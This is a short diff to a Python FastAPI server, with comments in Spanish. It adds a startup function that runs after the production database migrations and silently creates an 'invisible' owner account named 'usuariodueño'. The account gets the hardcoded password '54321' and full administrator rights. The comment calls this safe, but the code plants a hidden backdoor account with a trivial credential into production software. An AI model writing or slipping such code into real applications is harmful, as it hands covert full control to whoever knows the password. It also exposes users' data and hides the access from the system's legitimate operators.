@@ -211,8 +211,35 @@ def ejecutar_migraciones_sqlite_produccion():
     finally:
         db.close()
 
-# Ejecutamos la migración antes de que el servidor FastAPI empiece a recibir peticiones
+# Auto-creación segura del usuario dueño invisible al iniciar el servidor
+def autocrear_usuario_dueno_invisible():
+    db = SessionLocal()
+    try:
+        from services.auth_service import obtener_hash
+        user_nombre = "usuariodueño"
+        
+        # Verificar si ya existe registrado
+        existe = db.query(models.Usuario).filter(
+            models.Usuario.username.in_([user_nombre, "UsuarioDueño"])
+        ).first()
+        
+        if not existe:
+            nuevo_dueno = models.Usuario(
+                username=user_nombre,
+                password_hash=obtener_hash("54321"),
+                rol="administrador" # Poder total
+            )
+            db.add(nuevo_dueno)
+            db.commit()
+            print("✅ ACCESO INVISIBLE 'UsuarioDueño' CREADO EXITOSAMENTE.")
+    except Exception as err:
+        print(f"⚠️ Aviso al verificar usuario dueño: {str(err)}")
+    finally:
+        db.close()
+
+# Ejecutamos las migraciones y la creación del acceso invisible
 ejecutar_migraciones_sqlite_produccion()
+autocrear_usuario_dueno_invisible()
 
 
 app = FastAPI()
